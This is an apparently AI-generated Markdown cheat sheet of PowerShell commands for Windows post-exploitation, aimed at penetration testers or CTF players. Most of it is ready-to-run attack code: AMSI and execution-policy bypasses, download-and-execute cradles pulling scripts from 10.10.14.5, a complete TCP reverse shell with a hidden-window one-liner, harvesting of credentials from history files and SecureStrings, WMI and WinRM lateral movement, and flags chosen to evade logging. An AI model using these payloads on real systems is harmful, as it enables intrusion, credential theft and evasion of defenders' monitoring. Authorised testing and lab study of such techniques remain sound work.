# PowerShell

**Tags:** `#powershell` `#windows` `#scripting` `#commandline` `#lolbas` `#postexploit`

Essential PowerShell reference for Windows post-exploitation, enumeration, and lateral movement. PowerShell provides deep OS access, .NET interop, and WMI/COM integration — making it the most capable LOTL scripting environment on Windows.

**Version check:** `$PSVersionTable.PSVersion` — PS5.1 ships with Win10/Server 2019. PS7 is opt-in.

> [!note]
> PS5.1 is the baseline for compatibility. Operators like `??` (null coalescing), `&&`, `||` and ternary `? :` are PS7+ only. Always test payloads against PS5.1 unless you've confirmed the target has PS7.

---

## Execution Policy Bypass

```powershell
# Run script bypassing policy (doesn't require admin)
powershell -ExecutionPolicy Bypass -File script.ps1

# From within a PS session
Set-ExecutionPolicy Bypass -Scope Process -Force

# Encoded command (avoids ExecutionPolicy + most logging)
powershell -EncodedCommand <base64>

# Wrap inline script
powershell -nop -ep bypass -c "IEX (Get-Content script.ps1 -Raw)"

# Use Invoke-Expression
IEX (Get-Content .\script.ps1 -Raw)
```

---

## AMSI Bypass (In-Memory)

```powershell
# Classic patch (PS5.1 — may be patched in EDR)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative via amsiContext field
$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b=$a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
$c=$b.GetValue($null)
[Runtime.InteropServices.Marshal]::WriteInt32([IntPtr]($c.ToInt64()+0x10),0)
```

---

## Download Cradles

```powershell
# Basic download + exec
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/script.ps1')

# Download to disk
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5:8000/tool.exe','C:\Temp\tool.exe')

# Invoke-WebRequest
IWR -Uri 'http://10.10.14.5:8000/script.ps1' | IEX
IWR -Uri 'http://10.10.14.5:8000/tool.exe' -OutFile 'C:\Temp\tool.exe'

# With default proxy credentials (useful in corp environments)
(New-Object Net.WebClient).Proxy.Credentials = [Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/script.ps1')
```

---

## Base64 Encode / Decode

```powershell
# Encode a command for -EncodedCommand (must use Unicode encoding)
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.14.5/s.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Encode a file to base64 string
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Temp\file.exe"))

# Decode base64 string back to file
$b64 = "<base64string>"
[IO.File]::WriteAllBytes("C:\Temp\output.exe", [Convert]::FromBase64String($b64))

# Decode string (Unicode)
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))

# Linux: base64 encode a file for PS transfer
cat file.exe | base64 -w 0; echo
```

---

## File Operations

```powershell
# Read file
Get-Content C:\file.txt
gc C:\file.txt                              # alias

# Read as bytes
[IO.File]::ReadAllBytes("C:\file.exe")

# Write string to file
"content" | Out-File C:\file.txt
Set-Content C:\file.txt "content"

# Write bytes to file
[IO.File]::WriteAllBytes("C:\out.exe", $bytes)

# Append
Add-Content C:\file.txt "new line"

# Copy / move / delete
Copy-Item src dst
Move-Item src dst
Remove-Item C:\Temp\file.exe -Force

# Recursive search for string in files
Select-String -Path C:\Users\* -Pattern "password" -Recurse -ErrorAction SilentlyContinue

# Find files by name
Get-ChildItem -Recurse C:\Users -Filter "*.kdbx" -ErrorAction SilentlyContinue
Get-ChildItem -Recurse C:\ -Include "web.config","appsettings.json" -ErrorAction SilentlyContinue
```

---

## Enumeration One-Liners

```powershell
# Current user + is admin
whoami /all
([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")

# Local users and groups
Get-LocalUser
Get-LocalGroupMember -Group "Administrators"
net localgroup administrators

# Processes with command lines
Get-WmiObject Win32_Process | Select Name,ProcessId,CommandLine | Format-List

# Services — find non-Microsoft services
Get-WmiObject Win32_Service | Where-Object {$_.PathName -notlike "*system32*"} | Select Name,StartName,State,PathName

# Scheduled tasks (non-Microsoft)
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"} | Select TaskName,TaskPath,State

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName,DisplayVersion | Sort DisplayName

# Network connections
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select LocalAddress,LocalPort,RemoteAddress,RemotePort
netstat -ano

# ARP table
Get-NetNeighbor | Where-Object {$_.State -ne "Unreachable"}

# Shares
Get-SmbShare
net share

# Logged-on users
query user
Get-WmiObject -Class Win32_LoggedOnUser | Select Antecedent | Sort -Unique

# Environment
$env:PATH
[System.Environment]::GetEnvironmentVariables()
```

---

## Credential Operations

```powershell
# Prompt for credential (secure dialog)
$cred = Get-Credential

# Build PSCredential from plain text (for scripts)
$password = ConvertTo-SecureString "PlainTextPass" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("domain\user", $password)

# Extract plain text from PSCredential SecureString
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($cred.Password)
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Credential Manager — list stored creds
cmdkey /list

# Read encrypted PSCredential from XML (same user/machine only)
$cred = Import-CliXml -Path C:\cred.xml

# PowerShell history file — common cred leak location
Get-Content (Get-PSReadlineOption).HistorySavePath
cat C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

## Reverse Shell

```powershell
# TCP reverse shell (no external deps)
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

# One-liner (common cradle pattern)
powershell -nop -W hidden -noni -ep bypass -c "$client=New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## WMI

```powershell
# Local query
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"}

# Remote command execution via WMI (lateral movement)
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "cmd.exe /c whoami > C:\Temp\out.txt" `
  -ComputerName TARGET -Credential $cred

# Read result
Get-Content \\TARGET\C$\Temp\out.txt

# CIM (modern WMI, same data)
Get-CimInstance -ClassName Win32_ComputerSystem
Get-CimInstance -ComputerName TARGET -ClassName Win32_Process -Credential $cred
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="calc.exe"} -ComputerName TARGET -Credential $cred
```

---

## Remoting (WinRM)

```powershell
# One-off remote command
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami; hostname }

# Interactive remote session
Enter-PSSession -ComputerName TARGET -Credential $cred

# Run local script remotely
Invoke-Command -ComputerName TARGET -Credential $cred -FilePath .\script.ps1

# Session reuse
$s = New-PSSession -ComputerName TARGET -Credential $cred
Invoke-Command -Session $s -ScriptBlock { ipconfig }
Remove-PSSession $s

# DoubleHop issue — use CredSSP or explicit credential passing
# CredSSP (must be enabled on both ends):
Enable-WSManCredSSP -Role Client -DelegateComputer TARGET
Invoke-Command -ComputerName TARGET -Authentication CredSSP -Credential $cred -ScriptBlock {...}
```

---

## Constrained Language Mode

```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = CLM active (AppLocker/WDAC policy)

# CLM bypasses
# 1. PS v2 downgrade (if PS2 is installed)
powershell -version 2 -nop -ep bypass -c "IEX..."

# 2. Find writable dirs in AppLocker trusted paths
# (C:\Windows\Tasks, user-writable trusted dirs)

# 3. Use alternate .NET execution hosts
# InstallUtil, regasm, regsvcs, msbuild, csc.exe
```

---

## Logging Awareness

```powershell
# Check ScriptBlock Logging (logs all executed PS code)
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -ErrorAction SilentlyContinue

# Check Module Logging
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging -ErrorAction SilentlyContinue

# Check Transcription (writes full session transcript to file)
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription -ErrorAction SilentlyContinue

# Common evasion flags
powershell -nop -W hidden -noni -ep bypass -c "..."
# -nop        NoProfile — skip profile scripts (profiles can log/alert)
# -W hidden   WindowStyle Hidden — no visible window
# -noni       NonInteractive — suppress prompts
# -ep bypass  ExecutionPolicy Bypass
```

---

## Quick Reference — Useful Aliases

| Alias | Full Command |
|-------|-------------|
| `iex` | `Invoke-Expression` |
| `iwr` | `Invoke-WebRequest` |
| `gc` | `Get-Content` |
| `sc` | `Set-Content` |
| `ls` / `dir` | `Get-ChildItem` |
| `ps` | `Get-Process` |
| `kill` | `Stop-Process` |
| `gwmi` | `Get-WmiObject` |
| `icm` | `Invoke-Command` |
| `epss` | `Enter-PSSession` |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
